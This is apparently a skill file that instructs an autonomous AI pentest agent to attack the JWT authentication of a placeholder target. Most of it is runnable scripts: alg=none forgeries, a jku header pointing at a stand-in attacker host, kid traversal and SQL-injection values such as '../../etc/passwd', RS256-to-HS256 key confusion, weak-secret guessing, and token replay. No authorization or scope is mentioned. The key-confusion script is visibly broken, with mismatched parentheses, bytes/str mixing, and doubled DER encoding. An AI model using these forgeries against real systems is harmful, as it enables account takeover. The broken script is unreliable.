---
name: jwt_edge_cases
agent: agent4_auth
description: Attack JWTs via alg=none, jku/x5u key-URL injection, kid traversal/SQLi, weak HMAC secrets, RS256-to-HS256 confusion, missing claim validation, and token replay.
---

# JWT Edge Cases

## Purpose

JSON Web Tokens fail in predictable, high-impact ways: servers that accept `alg: none`, fetch attacker-controlled key URLs from `jku`/`x5u` headers, look up signing keys through injectable `kid` values, or verify HMAC signatures with weak, guessable, or even public keys. This skill systematically decodes every JWT the target issues, classifies it (access / refresh / ID token), and walks the full forgery ladder for each one. A single accepted forged token usually means full account takeover — the highest-impact outcome in the Auth & Session agent's scope. Chains beat single bugs: a weak secret found here feeds every other token on the target.

## Division of labor

- **Consumes:** raw JWT strings captured by sibling skills (login flows, `Set-Cookie` values, `Authorization: Bearer` headers, JSON login responses, `/.well-known/jwks.json` documents) and the target's protected-endpoint list
- **Produces:** the finished artifact — `findings/jwt_edge_cases_confirmed.md` with per-token verdicts and raw request/response pairs for every CONFIRMED forgery or acceptance

## When to use / when NOT to use

- **Use when:** the target issues anything shaped like `xxxxx.yyyyy.zzzzz` (three base64url segments) in cookies, headers, or JSON; a `/.well-known/jwks.json` or `openid-configuration` endpoint exists; login or refresh endpoints return signed tokens
- **Skip when (time-pass filter):** the "tokens" are opaque random session strings (not JWTs — hand to `session_fixation`). Ask: does it leak? Is it sensitive? Is it reachable unauthenticated? If you have a JWT but no reachable endpoint that accepts it (no oracle), there is nothing to test — park it as INCONCLUSIVE with the reason documented, don't burn cycles forging tokens into the void.

## Methodology

1. Harvest every JWT on the target: `Set-Cookie` headers on login, `Authorization` headers in JS fetch calls, JSON login/refresh responses, password-reset links, magic-link URLs. Record where each token is sent (cookie vs header vs body) and to which endpoint.
2. Decode each token's header and payload. Record `alg`, `kid`, `jku`, `x5u`, `typ`; record payload claims `exp`, `iat`, `nbf`, `aud`, `iss`, `sub`, and any role/privilege claims.
3. Classify each token: access token (short `exp`, `aud` = API), refresh token (long `exp`, sent only to a refresh endpoint), ID token (`iss` = IdP, carries user profile claims). Different classes get different attack priority: access > ID > refresh for forgery; refresh for reuse tests.
4. Establish the oracle baseline on one protected endpoint: record status + body length for (a) valid token, (b) no token, (c) garbage token, (d) known-dead path. The dead-path response is your control for every later comparison.
5. Run the `alg: none` attack first — it is the cheapest test with the highest payoff. Strip the signature, set `alg` to `none`, and try all three signature shapes: empty third segment (`h.p.`), missing segment (`h.p`), and literal `h.p.<base64("none")>`. Also try case variants (`None`, `NONE`) — some parsers lowercase before comparing.
6. Decision branch on observed header fields. If `jku` is present → step 7. If `x5u` is present → step 8. If `kid` is present → step 9. If `alg` is RS256/ES256 and a JWKS URL is reachable → step 10. If `alg` is HS256/HS384/HS512 → step 11. If none of these fields exist, skip to step 12 — do not invent attacks for fields that aren't there.
7. `jku` injection: forge a token whose `jku` points at a URL you control (a request-logging endpoint), sign it with a key from your own generated JWKS hosted there, and send it. The critical signal is the server's outbound fetch — if your logger sees a hit for the JWKS URL, the injection is live and you proceed to full key hosting. No fetch = NEGATIVE, move on.
8. `x5u` injection: same ladder as `jku`, but the URL must serve an X.509 certificate (PEM) whose public key you hold the private key for. Self-sign a cert with openssl, host it, point `x5u` at it, forge, and send. Again, the outbound fetch is the gate.
9. `kid` attacks. Try in order: (a) path traversal — `kid` values like `../../<guessed-keyfile>`, absolute paths, and null-byte variants, signed with `alg: none` or a weak secret; (b) SQL injection — `kid` values like `' OR '1'='1`, `' UNION SELECT '<known-key>'`, watching for changed error messages or accepted tokens; (c) `kid` pointing at attacker-influenced files (e.g. a filename you can create via avatar upload or a predictable temp path). Compare every response against the step-4 baseline — a different error string is a lead, an accepted token is a finding.
10. RS256 → HS256 confusion: fetch the server's public key from its JWKS endpoint, convert JWK to PEM, then forge a token with `alg: HS256` signed using that public key as the HMAC secret. If the server verifies HMAC with the RSA public key, the forged token is accepted. This is a classic CONFIRMED account-takeover primitive.
11. Weak HMAC secret brute force (only when `alg` is HS*): run the common-secrets list (inline list in Exact commands — keep it under 40 candidates, this is measurement not a dictionary attack). One MATCH = CONFIRMED forgery capability for every HS256 token on the target.
12. Claim-validation tests, each as an isolated single-variable change from a valid token: strip `exp` (accepted = missing expiry validation); set `exp` far in the past (accepted = no expiry check); change `aud` to another service or garbage (accepted = no audience check); change `iss` (accepted = no issuer check); set `nbf` in the future (accepted = no not-before check); escalate role claims (`role: admin`, `is_admin: true`) while keeping a valid signature — accepted privilege claim = broken authorization, hand the exact pair to `role_oracle`.
13. Token replay: (a) use the same access token from a different IP and User-Agent — accepted means no binding; (b) replay a refresh token twice — if both uses yield new access tokens, refresh rotation is missing; (c) replay a token after logout and after password change — accepted means server-side invalidation is missing (cross-reference `session_fixation`).
14. Cross-service reuse: take a token issued for one host/audience and present it to every other token-accepting endpoint you know (sibling subdomains, API versions, mobile vs web backends). Acceptance outside its `aud` = trust-boundary failure.
15. Verdict every token: CONFIRMED only with baseline + 2x independent reproduction + raw pairs; INCONCLUSIVE when you need a captured SAMLResponse-style artifact or a human (document exactly what is missing); NEGATIVE for dead ends so nobody re-tests them.

## Exact commands

Baseline (known-dead path control + oracle calibration on one protected endpoint):

```bash
BASE="https://<TARGET>"
PROTECTED="/api/me"
DEAD="/this-path-is-dead-9f3k2"
TOK="<TOKEN>"
echo "== dead path ==";        curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$DEAD"
echo "== no token ==";         curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED"
echo "== garbage ==";          curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer garbage.garbage.garbage"
echo "== valid token ==";      curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer $TOK"
```

Decode and classify any JWT:

```bash
python3 - "$TOK" <<'EOF'
import base64, json, sys, time
def d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)
tok = sys.argv[1]
h, p, s = tok.split('.')
hdr, pay = json.loads(d(h)), json.loads(d(p))
print("HEADER:", json.dumps(hdr, indent=2))
print("PAYLOAD:", json.dumps(pay, indent=2))
print("sig bytes:", len(d(s)) if s else 0)
exp = pay.get("exp")
if exp: print("expires in (s):", exp - int(time.time()), "| aud:", pay.get("aud"), "| iss:", pay.get("iss"))
kind = "id_token?" if pay.get("iss") and "email" in pay else ("refresh?" if exp and exp - int(time.time()) > 86400 else "access?")
print("CLASSIFICATION:", kind)
EOF
```

`alg: none` forgeries (try all three signature shapes):

```bash
python3 - "$TOK" <<'EOF' > /tmp/none_variants.txt
import base64, json, sys
def e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)
h, p, s = sys.argv[1].split('.')
hdr, pay = json.loads(d(h)), json.loads(d(p))
for alg in ("none", "None", "NONE"):
    hdr["alg"] = alg
    hp = e(json.dumps(hdr, separators=(",", ":")).encode()) + "." + e(json.dumps(pay, separators=(",", ":")).encode())
    print(hp + "."); print(hp); print(hp + "." + e(b"none"))
EOF
while read -r N; do
  [ -z "$N" ] && continue
  printf "none-variant -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer $N"
done < /tmp/none_variants.txt
```

`jku` injection — gate on the outbound fetch hitting your logger URL:

```bash
# 1. generate your own key + JWKS, host jwks.json at $EVIL/jwks.json, and put a request logger at $EVIL/
# 2. forge with jku pointed at it:
python3 - "$EVIL" <<'EOF'
import base64, json, sys
def e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
evil = sys.argv[1]
hdr = {"alg": "RS256", "typ": "JWT", "jku": evil + "/jwks.json", "kid": "evil-key-1"}
pay = {"sub": "victim", "role": "admin"}
print(e(json.dumps(hdr).encode()) + "." + e(json.dumps(pay).encode()) + ".FAKESIG")
EOF
# 3. send it, then CHECK YOUR LOGGER: no inbound fetch of /jwks.json => NEGATIVE, stop here.
```

`kid` traversal / SQLi probes (single-variable, compare to baseline):

```bash
for KID in '../../etc/passwd' '..%2f..%2fkey' "' OR '1'='1" "' UNION SELECT 'x" '/dev/null' 'nonexistent'; do
  printf "kid=[%s] -> " "$KID"
  curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer <NONE-SIGNED-TOKEN-WITH-KID-$KID>"
done
```

RS256 → HS256 confusion (public key from the target's own JWKS becomes the HMAC secret):

```bash
curl -sk "$BASE/.well-known/jwks.json" -o /tmp/jwks.json && head -c 300 /tmp/jwks.json; echo
python3 - "$TOK" /tmp/jwks.json <<'EOF' > /tmp/hs256_confused.jwt
import base64, json, sys, hashlib, hmac
def e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)
def b64i(s):
    s += '=' * (-len(s) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(s), "big")
tok = sys.argv[1]; jwks = json.load(open(sys.argv[2]))
h, p, s = tok.split('.'); pay = json.loads(d(p))
k = jwks["keys"][0]
# build PEM public key from JWK n/e
n, ex = b64i(k["n"]), b64i(k["e"])
def der_len(l):
    if l < 128: return bytes([l])
    b = l.to_bytes((l.bit_length()+7)//8, "big"); return bytes([0x80 | len(b)]) + b
def der_int(i):
    b = i.to_bytes((i.bit_length()+7)//8, "big")
    if b[0] & 0x80: b = b'\x00' + b
    return b'\x30' + der_len(len(b)) + b if False else b'\x02' + der_len(len(b)) + b
nb, eb = der_int(n), der_int(ex)
seq = b'\x02' + der_len(len(nb)) + nb + b'\x02' + der_len(len(eb)) + eb
inner = b'\x30' + der_len(len(seq)) + seq
bitstr = b'\x03' + der_len(len(inner)+1) + b'\x00' + inner
algid = b'\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00'
spki = b'\x30' + der_len(len(algid)+len(bitstr)) + algid + bitstr
pem = "-----BEGIN PUBLIC KEY-----\n" + base64.encodebytes(spki).decode() + "-----END PUBLIC KEY-----\n"
hdr = {"alg": "HS256", "typ": "JWT"}
hp = e(json.dumps(hdr, separators=(",", ":")).encode()) + "." + e(json.dumps(p, separators=(",", ":")).encode()) if False else None
# re-encode payload cleanly from decoded dict
hp = e(json.dumps(hdr, separators=(",", ":")).encode()) + b"." + e(json.dumps(pay, separators=(",", ":")).encode()))
sig = hmac.new(pem.encode(), hp.encode(), hashlib.sha256).digest()
print(hp + "." + e(sig))
EOF
CONFUSED=$(cat /tmp/hs256_confused.jwt)
for i in 1 2; do printf "hs256-confusion try $i -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer $CONFUSED"; done
```

Weak HMAC secret check (bounded list — measurement, not a dictionary attack):

```bash
for SECRET in secret password changeme 123456 qwerty letmein test testing admin password1 jwtsecret supersecret <TARGET> <HOST> key; do
python3 - "$TOK" "$SECRET" <<'EOF'
import base64, hashlib, hmac, sys
tok, secret = sys.argv[1], sys.argv[2]
try:
    h, p, sig = tok.split('.')
except ValueError:
    sys.exit()
sig += '=' * (-len(sig) % 4)
if hmac.compare_digest(hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest(), base64.urlsafe_b64decode(sig)):
    print("WEAK-SECRET-MATCH:", secret)
EOF
done
```

Claim-validation single-variable tests (strip exp / past exp / wrong aud — each compared to baseline):

```bash
python3 - "$TOK" <<'EOF'
import base64, json, sys, time
def e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)
h, p, s = sys.argv[1].split('.')
hdr, pay = json.loads(d(h)), json.loads(d(p))
def t(m):
    return e(json.dumps(hdr, separators=(",", ":")).encode()) + "." + e(json.dumps(m, separators=(",", ":")).encode()) + "." + s
noexp = dict(pay); noexp.pop("exp", None); open("/tmp/noexp.jwt", "w").write(t(noexp))
pastexp = dict(pay); pastexp["exp"] = int(time.time()) - 3600; open("/tmp/pastexp.jwt", "w").write(t(pastexp))
wrongaud = dict(pay); wrongaud["aud"] = "evil-audience"; open("/tmp/wrongaud.jwt", "w").write(t(wrongaud))
adminrole = dict(pay); adminrole["role"] = "admin"; adminrole["is_admin"] = True; open("/tmp/adminrole.jwt", "w").write(t(adminrole))
print("wrote /tmp/{noexp,pastexp,wrongaud,adminrole}.jwt (original signature kept: tests claim validation, not signature)")
EOF
for f in noexp pastexp wrongaud adminrole; do
  printf "$f -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer $(cat /tmp/$f.jwt)"
done
```

Refresh-token reuse and post-logout replay (2x verification built in):

```bash
REFRESH="<REFRESH_TOKEN>"
for i in 1 2; do printf "refresh reuse try $i -> "; curl -sk -w "\nHTTP:%{http_code}\n" -X POST "$BASE/auth/refresh" -H "Content-Type: application/json" --data "{\"refresh_token\":\"$REFRESH\"}" | tail -1; done
# after logout, replay the access token twice:
for i in 1 2; do printf "post-logout replay try $i -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$PROTECTED" -H "Authorization: Bearer $TOK"; done
```

## Completion-bias defenses

- [ ] Every JWT harvested with its source location recorded (cookie/header/body, endpoint)
- [ ] Every token decoded: header fields and payload claims logged
- [ ] Every token classified (access / refresh / ID)
- [ ] Oracle baseline recorded (valid / none / garbage / dead-path)
- [ ] alg=none tested in all three signature shapes + case variants
- [ ] Header-field decision branch followed (jku → x5u → kid → JWKS-confusion → weak-secret)
- [ ] jku/x5u gated on observed outbound fetch before claiming anything
- [ ] kid traversal and SQLi probed, responses compared to baseline
- [ ] RS256→HS256 confusion attempted where JWKS is reachable
- [ ] Weak-secret list exhausted (bounded) for HS* tokens
- [ ] Claim tests run as single-variable changes (exp strip, past exp, wrong aud/iss, future nbf, role escalation)
- [ ] Replay tests run (cross-IP/UA, refresh reuse, post-logout, post-password-change)
- [ ] Cross-service/audience reuse tested on every other token-accepting endpoint
- [ ] Every token has a verdict: CONFIRMED / INCONCLUSIVE / NEGATIVE
- **Review step:** agent10_review must verify (1) the finished artifact exists at `findings/jwt_edge_cases_confirmed.md`, (2) every CONFIRMED claim shows the baseline comparison AND two independent reproductions AND the full raw request/response pair, (3) no verdict rests on a single response without the dead-path control, (4) jku/x5u claims include logger evidence of the outbound fetch.
- **Nudge prompts:** "Keep going until you have tested every token class, not just the first access token that decoded." / "Do not report done before the finished artifact exists on disk with raw pairs for every CONFIRMED finding." / "If a header field isn't present, skip its attack branch — but document the skip, don't silently drop it."
- **Finished artifact definition:** `findings/jwt_edge_cases_confirmed.md` — one section per token (source, decoded header/payload, classification), per-attack results with verdicts, and full raw request/response pairs for every CONFIRMED forgery/acceptance.

## Evidence standard

- Baseline: every probe compared against the known-dead path AND the valid/garbage/no-token oracle on the same host — a "200" means nothing without the control
- Reproduction: 2x independent reproduction required (fresh token issuance between runs where possible; replays run twice)
- Raw evidence: full request/response pairs saved (request line + headers with token redacted to first 12 chars + full response status/headers/body)
- Verdicts: CONFIRMED (baseline + 2x repro + raw pairs) / INCONCLUSIVE (needs a second-model run, a captured artifact, or human — state exactly what) / NEGATIVE (dead end, documented with the negative evidence so nobody re-tests it)

## Handoffs

- `role_oracle`: receives every token where role-claim escalation was accepted (exact forged token + endpoint + response) to build the privilege-differential test list
- `session_fixation`: receives post-logout and post-password-change replay results to complete the invalidation picture
- `rate_limit_mapping`: receives the token endpoint set (login/refresh) so limiter probing covers token issuance
- agent10_review: consumes `findings/jwt_edge_cases_confirmed.md` as the shippable evidence bundle
